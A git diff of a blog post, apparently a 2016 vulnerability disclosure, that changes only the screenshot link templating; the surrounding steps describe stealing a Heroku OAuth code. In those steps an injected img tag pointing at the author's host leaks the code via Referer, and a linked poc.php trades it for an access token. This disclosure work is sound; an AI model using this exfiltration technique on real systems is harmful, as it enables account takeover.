@@ -38,55 +38,55 @@ Only worked if the user was already authenticated.
 
         https://longboard.heroku.com/login?state=https%3A%2F%2Fdashboard.heroku.com%2Fnew%3Ftemplate%3Dhttps%253A%252F%252Fgithub.com%252Fesevece%252Fheroku_test
 
-    ![1]({{ site.github.url }}/screenshots/2016-06-01-1.png)
+    ![1]({{ "/screenshots/2016-06-01-1.png" | prepend: site.baseurl | prepend: site.url }})
 
 2. User is redirected to 
 
         https://id.heroku.com/oauth/autorize?client_id=....
     
-    ![2]({{ site.github.url }}/screenshots/2016-06-01-2.png)
-    ![3]({{ site.github.url }}/screenshots/2016-06-01-3.png)
+    ![2]({{ "/screenshots/2016-06-01-2.png" | prepend: site.baseurl | prepend: site.url }})
+    ![3]({{ "/screenshots/2016-06-01-3.png" | prepend: site.baseurl | prepend: site.url }})
 
 3. User is redirected to
 
         https://longboard.heroku.com/auth/heroku/callback?code=....
 
-    ![4]({{ site.github.url }}/screenshots/2016-06-01-4.png)
-    ![5]({{ site.github.url }}/screenshots/2016-06-01-5.png)
+    ![4]({{ "/screenshots/2016-06-01-4.png" | prepend: site.baseurl | prepend: site.url }})
+    ![5]({{ "/screenshots/2016-06-01-5.png" | prepend: site.baseurl | prepend: site.url }})
 
 4. And finally, the user is redirected to
 
         https://dashboard.heroku.com/new?template=https%3A%2F%2Fgithub.com%2Fesevece%2Fheroku_test&code=...
 
-    ![6]({{ site.github.url }}/screenshots/2016-06-01-6.png)
-    ![7]({{ site.github.url }}/screenshots/2016-06-01-7.png)
+    ![6]({{ "/screenshots/2016-06-01-6.png" | prepend: site.baseurl | prepend: site.url }})
+    ![7]({{ "/screenshots/2016-06-01-7.png" | prepend: site.baseurl | prepend: site.url }})
 
 5. Once the page loads, a request is made to the Github API to get the file __app.json__
 
         https://api.github.com/repos/esevece/heroku_test/contents/app.json?ref=master
 
-    ![8]({{ site.github.url }}/screenshots/2016-06-01-8.png)
-    ![9]({{ site.github.url }}/screenshots/2016-06-01-9.png)
+    ![8]({{ "/screenshots/2016-06-01-8.png" | prepend: site.baseurl | prepend: site.url }})
+    ![9]({{ "/screenshots/2016-06-01-9.png" | prepend: site.baseurl | prepend: site.url }})
 
 6. The `<img src="https://u00f1.xyz/heroku/poc.php">` is created and the "image" is loaded, sending the __code__ in the `Referer`
-    ![10]({{ site.github.url }}/screenshots/2016-06-01-10.png)
+    ![10]({{ "/screenshots/2016-06-01-10.png" | prepend: site.baseurl | prepend: site.url }})
 
 7. My file <a href="https://github.com/esevece/esevece.github.io/blob/master/code/2016-06-01-poc.php" target="_blank">poc.php</a> captures the `Referer`, extracts the __code__ and makes a POST request to 
 
         https://longboard.heroku.com/login/token
 
     with the value of the parameter __password__ set to the value of __code__
-    ![11]({{ site.github.url }}/screenshots/2016-06-01-11.png)
+    ![11]({{ "/screenshots/2016-06-01-11.png" | prepend: site.baseurl | prepend: site.url }})
 
 8. <a href="https://github.com/esevece/esevece.github.io/blob/master/code/2016-06-01-poc.php" target="_blank">poc.php</a> takes the `"access_token"` from the last response and makes a GET request to 
 
         https://api.heroku.com/account
 
     with the header `Authorization:` set to `Bearer [the_access_token]`
-    ![12]({{ site.github.url }}/screenshots/2016-06-01-12.png)
+    ![12]({{ "/screenshots/2016-06-01-12.png" | prepend: site.baseurl | prepend: site.url }})
 
 9. <a href="https://github.com/esevece/esevece.github.io/blob/master/code/2016-06-01-poc.php" target="_blank">poc.php</a> takes the `"email"` from the last response and sends an email to the address
-    ![13]({{ site.github.url }}/screenshots/2016-06-01-13.png)
+    ![13]({{ "/screenshots/2016-06-01-13.png" | prepend: site.baseurl | prepend: site.url }})
 
 Art Attack
 ======
